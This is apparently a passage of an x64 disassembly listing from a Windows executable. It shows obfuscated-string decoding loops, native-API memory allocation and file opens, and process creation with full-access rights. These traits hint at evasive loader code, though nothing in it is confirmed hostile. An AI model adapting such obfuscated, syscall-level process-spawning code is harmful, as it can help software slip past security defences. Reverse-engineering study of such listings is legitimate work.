   140001ee2:	74 28                	je     0x140001f0c
   140001ee4:	48 89 c8             	mov    %rcx,%rax
   140001ee7:	4c 8d 41 0a          	lea    0xa(%rcx),%r8
   140001eeb:	66 8b 10             	mov    (%rax),%dx
   140001eee:	48 83 c0 02          	add    $0x2,%rax
   140001ef2:	66 81 c2 41 31       	add    $0x3141,%dx
   140001ef7:	66 81 e2 ff 00       	and    $0xff,%dx
   140001efc:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140001f00:	49 39 c0             	cmp    %rax,%r8
   140001f03:	75 e6                	jne    0x140001eeb
   140001f05:	c6 05 6e a4 57 00 00 	movb   $0x0,0x57a46e(%rip)        # 0x14057c37a
   140001f0c:	4c 8b 84 24 c8 03 00 	mov    0x3c8(%rsp),%r8
   140001f13:	00 
   140001f14:	48 89 ca             	mov    %rcx,%rdx
   140001f17:	48 89 f9             	mov    %rdi,%rcx
   140001f1a:	e8 b6 fc ff ff       	call   0x140001bd5
   140001f1f:	48 8d 8c 24 c8 00 00 	lea    0xc8(%rsp),%rcx
   140001f26:	00 
   140001f27:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   140001f2d:	48 89 fa             	mov    %rdi,%rdx
   140001f30:	e8 05 f5 ff ff       	call   0x14000143a
   140001f35:	48 85 f6             	test   %rsi,%rsi
   140001f38:	74 18                	je     0x140001f52
   140001f3a:	48 8d 8c 24 d8 00 00 	lea    0xd8(%rsp),%rcx
   140001f41:	00 
   140001f42:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140001f48:	48 89 f2             	mov    %rsi,%rdx
   140001f4b:	e8 ea f4 ff ff       	call   0x14000143a
   140001f50:	eb 0e                	jmp    0x140001f60
   140001f52:	41 0f 10 54 24 38    	movups 0x38(%r12),%xmm2
   140001f58:	0f 11 94 24 d8 00 00 	movups %xmm2,0xd8(%rsp)
   140001f5f:	00 
   140001f60:	48 85 ed             	test   %rbp,%rbp
   140001f63:	74 18                	je     0x140001f7d
   140001f65:	48 8d 8c 24 e8 00 00 	lea    0xe8(%rsp),%rcx
   140001f6c:	00 
   140001f6d:	41 b8 ff 7f 00 00    	mov    $0x7fff,%r8d
   140001f73:	48 89 ea             	mov    %rbp,%rdx
   140001f76:	e8 bf f4 ff ff       	call   0x14000143a
   140001f7b:	eb 10                	jmp    0x140001f8d
   140001f7d:	0f 10 9c 24 c8 00 00 	movups 0xc8(%rsp),%xmm3
   140001f84:	00 
   140001f85:	0f 11 9c 24 e8 00 00 	movups %xmm3,0xe8(%rsp)
   140001f8c:	00 
   140001f8d:	48 83 bc 24 e0 03 00 	cmpq   $0x0,0x3e0(%rsp)
   140001f94:	00 00 
   140001f96:	66 c7 44 24 76 00 00 	movw   $0x0,0x76(%rsp)
   140001f9d:	48 8d b4 24 f8 00 00 	lea    0xf8(%rsp),%rsi
   140001fa4:	00 
   140001fa5:	74 1a                	je     0x140001fc1
   140001fa7:	48 8b 8c 24 e0 03 00 	mov    0x3e0(%rsp),%rcx
   140001fae:	00 
   140001faf:	e8 ac 1f 00 00       	call   0x140003f60
   140001fb4:	48 8b 94 24 e0 03 00 	mov    0x3e0(%rsp),%rdx
   140001fbb:	00 
   140001fbc:	49 89 c0             	mov    %rax,%r8
   140001fbf:	eb 0b                	jmp    0x140001fcc
   140001fc1:	48 8d 54 24 76       	lea    0x76(%rsp),%rdx
   140001fc6:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001fcc:	48 89 f1             	mov    %rsi,%rcx
   140001fcf:	4c 8d ac 24 a0 00 00 	lea    0xa0(%rsp),%r13
   140001fd6:	00 
   140001fd7:	48 8d ac 24 98 00 00 	lea    0x98(%rsp),%rbp
   140001fde:	00 
   140001fdf:	e8 56 f4 ff ff       	call   0x14000143a
   140001fe4:	4d 89 e9             	mov    %r13,%r9
   140001fe7:	45 31 c0             	xor    %r8d,%r8d
   140001fea:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140001fee:	0f b7 84 24 c8 00 00 	movzwl 0xc8(%rsp),%eax
   140001ff5:	00 
   140001ff6:	0f b7 94 24 d8 00 00 	movzwl 0xd8(%rsp),%edx
   140001ffd:	00 
   140001ffe:	49 89 c6             	mov    %rax,%r14
   140002001:	8d bc 02 16 04 00 00 	lea    0x416(%rdx,%rax,1),%edi
   140002008:	31 d2                	xor    %edx,%edx
   14000200a:	0f b7 84 24 e8 00 00 	movzwl 0xe8(%rsp),%eax
   140002011:	00 
   140002012:	48 89 94 24 98 00 00 	mov    %rdx,0x98(%rsp)
   140002019:	00 
   14000201a:	48 89 ea             	mov    %rbp,%rdx
   14000201d:	01 c7                	add    %eax,%edi
   14000201f:	0f b7 84 24 f8 00 00 	movzwl 0xf8(%rsp),%eax
   140002026:	00 
   140002027:	01 c7                	add    %eax,%edi
   140002029:	41 0f b7 44 24 50    	movzwl 0x50(%r12),%eax
   14000202f:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002036:	00 
   140002037:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   14000203e:	00 
   14000203f:	01 f8                	add    %edi,%eax
   140002041:	48 89 c7             	mov    %rax,%rdi
   140002044:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
   14000204b:	00 
   14000204c:	e8 a2 10 00 00       	call   0x1400030f3
   140002051:	48 8b b4 24 98 00 00 	mov    0x98(%rsp),%rsi
   140002058:	00 
   140002059:	45 31 c0             	xor    %r8d,%r8d
   14000205c:	49 8b 84 24 80 00 00 	mov    0x80(%r12),%rax
   140002063:	00 
   140002064:	41 0f 10 6c 24 50    	movups 0x50(%r12),%xmm5
   14000206a:	0f 10 a4 24 d8 00 00 	movups 0xd8(%rsp),%xmm4
   140002071:	00 
   140002072:	b9 14 00 00 00       	mov    $0x14,%ecx
   140002077:	48 89 86 80 00 00 00 	mov    %rax,0x80(%rsi)
   14000207e:	49 8b 84 24 f0 03 00 	mov    0x3f0(%r12),%rax
   140002085:	00 
   140002086:	4c 8d a4 24 b0 00 00 	lea    0xb0(%rsp),%r12
   14000208d:	00 
   14000208e:	0f 10 84 24 c8 00 00 	movups 0xc8(%rsp),%xmm0
   140002095:	00 
   140002096:	0f 10 8c 24 e8 00 00 	movups 0xe8(%rsp),%xmm1
   14000209d:	00 
   14000209e:	89 3e                	mov    %edi,(%rsi)
   1400020a0:	4d 89 e1             	mov    %r12,%r9
   1400020a3:	0f 10 94 24 f8 00 00 	movups 0xf8(%rsp),%xmm2
   1400020aa:	00 
   1400020ab:	89 7e 04             	mov    %edi,0x4(%rsi)
   1400020ae:	48 8d bc 24 10 01 00 	lea    0x110(%rsp),%rdi
   1400020b5:	00 
   1400020b6:	48 89 86 f0 03 00 00 	mov    %rax,0x3f0(%rsi)
   1400020bd:	31 c0                	xor    %eax,%eax
   1400020bf:	0f 11 66 38          	movups %xmm4,0x38(%rsi)
   1400020c3:	0f 11 6e 50          	movups %xmm5,0x50(%rsi)
   1400020c7:	0f 11 46 60          	movups %xmm0,0x60(%rsi)
   1400020cb:	0f 11 4e 70          	movups %xmm1,0x70(%rsi)
   1400020cf:	0f 11 96 d0 00 00 00 	movups %xmm2,0xd0(%rsi)
   1400020d6:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%rsi)
   1400020dd:	48 c7 46 10 fd ff ff 	movq   $0xfffffffffffffffd,0x10(%rsi)
   1400020e4:	ff 
   1400020e5:	f3 ab                	rep stos %eax,(%rdi)
   1400020e7:	31 c9                	xor    %ecx,%ecx
   1400020e9:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400020f0:	00 
   1400020f1:	48 8d bc 24 a8 00 00 	lea    0xa8(%rsp),%rdi
   1400020f8:	00 
   1400020f9:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140002100:	00 
   140002101:	48 89 fa             	mov    %rdi,%rdx
   140002104:	48 89 8c 24 a8 00 00 	mov    %rcx,0xa8(%rsp)
   14000210b:	00 
   14000210c:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140002110:	48 c7 84 24 08 01 00 	movq   $0x58,0x108(%rsp)
   140002117:	00 58 00 00 00 
   14000211c:	48 c7 84 24 b0 00 00 	movq   $0x60,0xb0(%rsp)
   140002123:	00 60 00 00 00 
   140002128:	e8 c6 0f 00 00       	call   0x1400030f3
   14000212d:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   140002134:	00 
   140002135:	45 31 c9             	xor    %r9d,%r9d
   140002138:	45 31 c0             	xor    %r8d,%r8d
   14000213b:	48 8b 94 24 d0 00 00 	mov    0xd0(%rsp),%rdx
   140002142:	00 
   140002143:	48 8d 8c 24 b8 00 00 	lea    0xb8(%rsp),%rcx
   14000214a:	00 
   14000214b:	48 c7 00 68 00 00 00 	movq   $0x68,(%rax)
   140002152:	48 89 50 18          	mov    %rdx,0x18(%rax)
   140002156:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   14000215b:	4c 89 70 10          	mov    %r14,0x10(%rax)
   14000215f:	48 89 50 38          	mov    %rdx,0x38(%rax)
   140002163:	48 8b 94 24 90 00 00 	mov    0x90(%rsp),%rdx
   14000216a:	00 
   14000216b:	48 c7 40 08 05 00 02 	movq   $0x20005,0x8(%rax)
   140002172:	00 
   140002173:	48 89 50 58          	mov    %rdx,0x58(%rax)
   140002177:	48 8d 94 24 c0 00 00 	lea    0xc0(%rsp),%rdx
   14000217e:	00 
   14000217f:	48 c7 40 28 00 00 06 	movq   $0x60000,0x28(%rax)
   140002186:	00 
   140002187:	48 c7 40 30 08 00 00 	movq   $0x8,0x30(%rax)
   14000218e:	00 
   14000218f:	48 c7 40 48 02 00 06 	movq   $0x60002,0x48(%rax)
   140002196:	00 
   140002197:	48 c7 40 50 08 00 00 	movq   $0x8,0x50(%rax)
   14000219e:	00 
   14000219f:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400021a4:	48 8d 84 24 08 01 00 	lea    0x108(%rsp),%rax
   1400021ab:	00 
   1400021ac:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400021b1:	8b 84 24 f0 03 00 00 	mov    0x3f0(%rsp),%eax
   1400021b8:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   1400021bd:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400021c1:	8b 84 24 e8 03 00 00 	mov    0x3e8(%rsp),%eax
   1400021c8:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400021cd:	41 b9 ff ff 1f 00    	mov    $0x1fffff,%r9d
   1400021d3:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   1400021d8:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400021dc:	4c 89 84 24 c0 00 00 	mov    %r8,0xc0(%rsp)
   1400021e3:	00 
   1400021e4:	41 b8 ff ff 1f 00    	mov    $0x1fffff,%r8d
   1400021ea:	e8 46 0f 00 00       	call   0x140003135
   1400021ef:	4d 89 e8             	mov    %r13,%r8
   1400021f2:	48 89 ea             	mov    %rbp,%rdx
   1400021f5:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1400021f9:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1400021ff:	e8 07 0f 00 00       	call   0x14000310b
   140002204:	4d 89 e0             	mov    %r12,%r8
   140002207:	48 89 fa             	mov    %rdi,%rdx
   14000220a:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000220e:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002214:	e8 f2 0e 00 00       	call   0x14000310b
   140002219:	48 8b 84 24 b8 00 00 	mov    0xb8(%rsp),%rax
   140002220:	00 
   140002221:	45 31 d2             	xor    %r10d,%r10d
   140002224:	4c 89 53 10          	mov    %r10,0x10(%rbx)
   140002228:	48 89 03             	mov    %rax,(%rbx)
   14000222b:	48 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%rax
   140002232:	00 
   140002233:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140002237:	48 89 d8             	mov    %rbx,%rax
   14000223a:	48 81 c4 78 03 00 00 	add    $0x378,%rsp
   140002241:	5b                   	pop    %rbx
   140002242:	5e                   	pop    %rsi
   140002243:	5f                   	pop    %rdi
   140002244:	5d                   	pop    %rbp
   140002245:	41 5c                	pop    %r12
   140002247:	41 5d                	pop    %r13
   140002249:	41 5e                	pop    %r14
   14000224b:	41 5f                	pop    %r15
   14000224d:	c3                   	ret
   14000224e:	55                   	push   %rbp
   14000224f:	b8 78 00 01 00       	mov    $0x10078,%eax
   140002254:	57                   	push   %rdi
   140002255:	56                   	push   %rsi
   140002256:	53                   	push   %rbx
   140002257:	e8 b4 1b 00 00       	call   0x140003e10
   14000225c:	48 29 c4             	sub    %rax,%rsp
   14000225f:	31 c0                	xor    %eax,%eax
   140002261:	89 cb                	mov    %ecx,%ebx
   140002263:	48 8d 7c 24 72       	lea    0x72(%rsp),%rdi
   140002268:	b9 fe ff 00 00       	mov    $0xfffe,%ecx
   14000226d:	4c 89 c6             	mov    %r8,%rsi
   140002270:	f3 aa                	rep stos %al,(%rdi)
   140002272:	48 8d 7c 24 72       	lea    0x72(%rsp),%rdi
   140002277:	4c 8d 84 24 c0 00 01 	lea    0x100c0(%rsp),%r8
   14000227e:	00 
   14000227f:	48 89 d5             	mov    %rdx,%rbp
   140002282:	48 89 f9             	mov    %rdi,%rcx
   140002285:	4c 89 ca             	mov    %r9,%rdx
   140002288:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   14000228d:	e8 66 f7 ff ff       	call   0x1400019f8
   140002292:	31 c0                	xor    %eax,%eax
   140002294:	31 d2                	xor    %edx,%edx
   140002296:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000229b:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400022a0:	49 89 e9             	mov    %rbp,%r9
   1400022a3:	48 89 f2             	mov    %rsi,%rdx
   1400022a6:	49 89 f8             	mov    %rdi,%r8
   1400022a9:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400022ad:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400022b1:	e8 43 f9 ff ff       	call   0x140001bf9
   1400022b6:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400022bb:	84 db                	test   %bl,%bl
   1400022bd:	74 18                	je     0x1400022d7
   1400022bf:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400022c4:	31 d2                	xor    %edx,%edx
   1400022c6:	48 89 f1             	mov    %rsi,%rcx
   1400022c9:	48 c7 44 24 50 00 5d 	movq   $0xffffffffee1e5d00,0x50(%rsp)
   1400022d0:	1e ee 
   1400022d2:	e8 7c 0e 00 00       	call   0x140003153
   1400022d7:	48 89 f1             	mov    %rsi,%rcx
   1400022da:	e8 bd 0d 00 00       	call   0x14000309c
   1400022df:	90                   	nop
   1400022e0:	48 81 c4 78 00 01 00 	add    $0x10078,%rsp
   1400022e7:	5b                   	pop    %rbx
   1400022e8:	5e                   	pop    %rsi
   1400022e9:	5f                   	pop    %rdi
   1400022ea:	5d                   	pop    %rbp
   1400022eb:	c3                   	ret
   1400022ec:	57                   	push   %rdi
   1400022ed:	56                   	push   %rsi
   1400022ee:	53                   	push   %rbx
   1400022ef:	48 83 ec 20          	sub    $0x20,%rsp
   1400022f3:	48 89 cb             	mov    %rcx,%rbx
   1400022f6:	48 89 d1             	mov    %rdx,%rcx
   1400022f9:	48 89 d7             	mov    %rdx,%rdi
   1400022fc:	e8 5f 1c 00 00       	call   0x140003f60
   140002301:	48 89 c6             	mov    %rax,%rsi
   140002304:	66 83 3b 00          	cmpw   $0x0,(%rbx)
   140002308:	74 2a                	je     0x140002334
   14000230a:	49 89 f0             	mov    %rsi,%r8
   14000230d:	48 89 fa             	mov    %rdi,%rdx
   140002310:	48 89 d9             	mov    %rbx,%rcx
   140002313:	e8 60 1c 00 00       	call   0x140003f78
   140002318:	85 c0                	test   %eax,%eax
   14000231a:	75 09                	jne    0x140002325
   14000231c:	48 01 f6             	add    %rsi,%rsi
   14000231f:	48 8d 04 33          	lea    (%rbx,%rsi,1),%rax
   140002323:	eb 11                	jmp    0x140002336
   140002325:	48 89 d9             	mov    %rbx,%rcx
   140002328:	e8 33 1c 00 00       	call   0x140003f60
   14000232d:	48 8d 5c 43 02       	lea    0x2(%rbx,%rax,2),%rbx
   140002332:	eb d0                	jmp    0x140002304
   140002334:	31 c0                	xor    %eax,%eax
   140002336:	48 83 c4 20          	add    $0x20,%rsp
   14000233a:	5b                   	pop    %rbx
   14000233b:	5e                   	pop    %rsi
   14000233c:	5f                   	pop    %rdi
   14000233d:	c3                   	ret
   14000233e:	57                   	push   %rdi
   14000233f:	56                   	push   %rsi
   140002340:	53                   	push   %rbx
   140002341:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
   140002348:	31 c0                	xor    %eax,%eax
   14000234a:	80 3d 1f 9e 57 00 00 	cmpb   $0x0,0x579e1f(%rip)        # 0x14057c170
   140002351:	48 89 cb             	mov    %rcx,%rbx
   140002354:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002359:	b9 84 00 00 00       	mov    $0x84,%ecx
   14000235e:	48 89 d6             	mov    %rdx,%rsi
   140002361:	f3 ab                	rep stos %eax,(%rdi)
   140002363:	66 c7 44 24 2e 7d 00 	movw   $0x7d,0x2e(%rsp)
   14000236a:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   14000236f:	48 b8 d9 00 bc 00 bc 	movabs $0xd900bc00bc00d9,%rax
   140002376:	00 d9 00 
   140002379:	48 89 44 24 26       	mov    %rax,0x26(%rsp)
   14000237e:	75 3a                	jne    0x1400023ba
   140002380:	48 8d 0d a9 f0 ff ff 	lea    -0xf57(%rip),%rcx        # 0x140001430
   140002387:	4c 89 84 24 70 02 00 	mov    %r8,0x270(%rsp)
   14000238e:	00 
   14000238f:	c6 05 ec 9d 57 00 01 	movb   $0x1,0x579dec(%rip)        # 0x14057c182
   140002396:	48 89 05 db 9d 57 00 	mov    %rax,0x579ddb(%rip)        # 0x14057c178
   14000239d:	66 c7 05 da 9d 57 00 	movw   $0x7d,0x579dda(%rip)        # 0x14057c180
   1400023a4:	7d 00 
   1400023a6:	c6 05 c3 9d 57 00 01 	movb   $0x1,0x579dc3(%rip)        # 0x14057c170
   1400023ad:	e8 83 ef ff ff       	call   0x140001335
   1400023b2:	4c 8b 84 24 70 02 00 	mov    0x270(%rsp),%r8
   1400023b9:	00 
   1400023ba:	80 3d c1 9d 57 00 00 	cmpb   $0x0,0x579dc1(%rip)        # 0x14057c182
   1400023c1:	48 8d 0d b0 9d 57 00 	lea    0x579db0(%rip),%rcx        # 0x14057c178
   1400023c8:	74 28                	je     0x1400023f2
   1400023ca:	48 89 c8             	mov    %rcx,%rax
   1400023cd:	4c 8d 49 0a          	lea    0xa(%rcx),%r9
   1400023d1:	66 8b 10             	mov    (%rax),%dx
   1400023d4:	48 83 c0 02          	add    $0x2,%rax
   1400023d8:	66 81 ea 7d 30       	sub    $0x307d,%dx
   1400023dd:	66 81 e2 ff 00       	and    $0xff,%dx
   1400023e2:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   1400023e6:	4c 39 c8             	cmp    %r9,%rax
   1400023e9:	75 e6                	jne    0x1400023d1
   1400023eb:	c6 05 90 9d 57 00 00 	movb   $0x0,0x579d90(%rip)        # 0x14057c182
   1400023f2:	48 89 ca             	mov    %rcx,%rdx
   1400023f5:	48 89 f9             	mov    %rdi,%rcx
   1400023f8:	e8 d8 f7 ff ff       	call   0x140001bd5
   1400023fd:	66 c7 46 02 10 02    	movw   $0x210,0x2(%rsi)
   140002403:	48 89 f9             	mov    %rdi,%rcx
   140002406:	e8 55 1b 00 00       	call   0x140003f60
   14000240b:	31 d2                	xor    %edx,%edx
   14000240d:	48 89 7e 08          	mov    %rdi,0x8(%rsi)
   140002411:	01 c0                	add    %eax,%eax
   140002413:	66 89 06             	mov    %ax,(%rsi)
   140002416:	31 c0                	xor    %eax,%eax
   140002418:	c7 03 30 00 00 00    	movl   $0x30,(%rbx)
   14000241e:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140002422:	c7 43 18 40 00 00 00 	movl   $0x40,0x18(%rbx)
   140002429:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   14000242d:	48 89 53 20          	mov    %rdx,0x20(%rbx)
   140002431:	48 89 53 28          	mov    %rdx,0x28(%rbx)
   140002435:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
   14000243c:	5b                   	pop    %rbx
   14000243d:	5e                   	pop    %rsi
   14000243e:	5f                   	pop    %rdi
   14000243f:	c3                   	ret
   140002440:	57                   	push   %rdi
   140002441:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140002448:	31 c0                	xor    %eax,%eax
   14000244a:	49 89 c8             	mov    %rcx,%r8
   14000244d:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   140002454:	00 
   140002455:	b9 0c 00 00 00       	mov    $0xc,%ecx
   14000245a:	f3 ab                	rep stos %eax,(%rdi)
   14000245c:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   140002463:	00 
   140002464:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140002469:	48 89 f9             	mov    %rdi,%rcx
   14000246c:	e8 cd fe ff ff       	call   0x14000233e
   140002471:	31 c0                	xor    %eax,%eax
   140002473:	31 d2                	xor    %edx,%edx
   140002475:	45 31 c0             	xor    %r8d,%r8d
   140002478:	45 31 c9             	xor    %r9d,%r9d
   14000247b:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140002480:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140002485:	ba 16 01 12 00       	mov    $0x120116,%edx
   14000248a:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   14000248f:	49 89 f8             	mov    %rdi,%r8
   140002492:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002497:	4c 8d 0d c2 9c 57 00 	lea    0x579cc2(%rip),%r9        # 0x14057c160
   14000249e:	89 44 24 50          	mov    %eax,0x50(%rsp)
   1400024a2:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   1400024a9:	00 
   1400024aa:	c7 44 24 38 03 00 00 	movl   $0x3,0x38(%rsp)
   1400024b1:	00 
   1400024b2:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400024b9:	00 
   1400024ba:	e8 9e 0b 00 00       	call   0x14000305d
   1400024bf:	89 c2                	mov    %eax,%edx
   1400024c1:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400024c5:	85 d2                	test   %edx,%edx
   1400024c7:	78 05                	js     0x1400024ce
   1400024c9:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   1400024ce:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   1400024d5:	5f                   	pop    %rdi
   1400024d6:	c3                   	ret
   1400024d7:	55                   	push   %rbp
   1400024d8:	57                   	push   %rdi
   1400024d9:	56                   	push   %rsi
   1400024da:	53                   	push   %rbx
   1400024db:	48 81 ec 38 02 00 00 	sub    $0x238,%rsp
   1400024e2:	31 c0                	xor    %eax,%eax
   1400024e4:	31 db                	xor    %ebx,%ebx
   1400024e6:	48 8d 6c 24 28       	lea    0x28(%rsp),%rbp
   1400024eb:	48 89 ce             	mov    %rcx,%rsi
   1400024ee:	b9 82 00 00 00       	mov    $0x82,%ecx
   1400024f3:	48 89 ef             	mov    %rbp,%rdi
   1400024f6:	f3 ab                	rep stos %eax,(%rdi)
   1400024f8:	48 89 f1             	mov    %rsi,%rcx
   1400024fb:	e8 60 1a 00 00       	call   0x140003f60
   140002500:	48 89 c7             	mov    %rax,%rdi
   140002503:	66 8b 04 5e          	mov    (%rsi,%rbx,2),%ax
   140002507:	66 89 44 5d 00       	mov    %ax,0x0(%rbp,%rbx,2)
   14000250c:	66 83 f8 2f          	cmp    $0x2f,%ax
   140002510:	74 06                	je     0x140002518
   140002512:	66 83 f8 5c          	cmp    $0x5c,%ax
   140002516:	75 10                	jne    0x140002528
   140002518:	48 89 e9             	mov    %rbp,%rcx
   14000251b:	e8 20 ff ff ff       	call   0x140002440
   140002520:	48 89 c1             	mov    %rax,%rcx
   140002523:	e8 74 0b 00 00       	call   0x14000309c
   140002528:	48 ff c3             	inc    %rbx
   14000252b:	48 39 df             	cmp    %rbx,%rdi
   14000252e:	73 d3                	jae    0x140002503
   140002530:	48 81 c4 38 02 00 00 	add    $0x238,%rsp
   140002537:	5b                   	pop    %rbx
   140002538:	5e                   	pop    %rsi
   140002539:	5f                   	pop    %rdi
   14000253a:	5d                   	pop    %rbp
   14000253b:	c3                   	ret
   14000253c:	57                   	push   %rdi
   14000253d:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140002544:	31 c0                	xor    %eax,%eax
   140002546:	49 89 c8             	mov    %rcx,%r8
   140002549:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   140002550:	00 
   140002551:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140002556:	f3 ab                	rep stos %eax,(%rdi)
   140002558:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   14000255f:	00 
   140002560:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140002565:	48 89 f9             	mov    %rdi,%rcx
   140002568:	e8 d1 fd ff ff       	call   0x14000233e
   14000256d:	31 c0                	xor    %eax,%eax
   14000256f:	31 d2                	xor    %edx,%edx
   140002571:	45 31 c0             	xor    %r8d,%r8d
   140002574:	45 31 c9             	xor    %r9d,%r9d
   140002577:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   14000257c:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140002581:	ba 00 00 11 c0       	mov    $0xc0110000,%edx
   140002586:	44 89 44 24 38       	mov    %r8d,0x38(%rsp)
   14000258b:	49 89 f8             	mov    %rdi,%r8
   14000258e:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002593:	4c 8d 0d c6 9b 57 00 	lea    0x579bc6(%rip),%r9        # 0x14057c160
   14000259a:	89 44 24 50          	mov    %eax,0x50(%rsp)
   14000259e:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   1400025a5:	00 
   1400025a6:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   1400025ad:	00 
   1400025ae:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400025b5:	00 
   1400025b6:	e8 a2 0a 00 00       	call   0x14000305d
   1400025bb:	89 c2                	mov    %eax,%edx
   1400025bd:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400025c1:	85 d2                	test   %edx,%edx
   1400025c3:	78 05                	js     0x1400025ca
   1400025c5:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   1400025ca:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   1400025d1:	5f                   	pop    %rdi
   1400025d2:	c3                   	ret
   1400025d3:	57                   	push   %rdi
   1400025d4:	56                   	push   %rsi
   1400025d5:	53                   	push   %rbx
   1400025d6:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
   1400025da:	31 c0                	xor    %eax,%eax
   1400025dc:	49 89 c8             	mov    %rcx,%r8
   1400025df:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   1400025e4:	b9 0c 00 00 00       	mov    $0xc,%ecx
   1400025e9:	89 d6                	mov    %edx,%esi
   1400025eb:	f3 ab                	rep stos %eax,(%rdi)
   1400025ed:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   1400025f2:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400025f7:	48 89 d9             	mov    %rbx,%rcx
   1400025fa:	e8 3f fd ff ff       	call   0x14000233e
   1400025ff:	40 84 f6             	test   %sil,%sil
   140002602:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140002607:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   14000260e:	00 
   14000260f:	74 19                	je     0x14000262a
   140002611:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140002618:	00 
   140002619:	4c 8d 0d 40 9b 57 00 	lea    0x579b40(%rip),%r9        # 0x14057c160
   140002620:	49 89 d8             	mov    %rbx,%r8
   140002623:	ba 00 00 10 80       	mov    $0x80100000,%edx
   140002628:	eb 17                	jmp    0x140002641
   14000262a:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140002631:	00 
   140002632:	4c 8d 0d 27 9b 57 00 	lea    0x579b27(%rip),%r9        # 0x14057c160
   140002639:	49 89 d8             	mov    %rbx,%r8
   14000263c:	ba 00 00 11 c0       	mov    $0xc0110000,%edx
   140002641:	e8 74 0a 00 00       	call   0x1400030ba
   140002646:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   14000264a:	85 c0                	test   %eax,%eax
   14000264c:	78 05                	js     0x140002653
   14000264e:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140002653:	48 89 d0             	mov    %rdx,%rax
   140002656:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
   14000265a:	5b                   	pop    %rbx
   14000265b:	5e                   	pop    %rsi
   14000265c:	5f                   	pop    %rdi
   14000265d:	c3                   	ret
   14000265e:	57                   	push   %rdi
   14000265f:	56                   	push   %rsi
   140002660:	53                   	push   %rbx
   140002661:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
   140002665:	48 89 d6             	mov    %rdx,%rsi
   140002668:	ba 01 00 00 00       	mov    $0x1,%edx
   14000266d:	e8 61 ff ff ff       	call   0x1400025d3
   140002672:	48 89 c3             	mov    %rax,%rbx
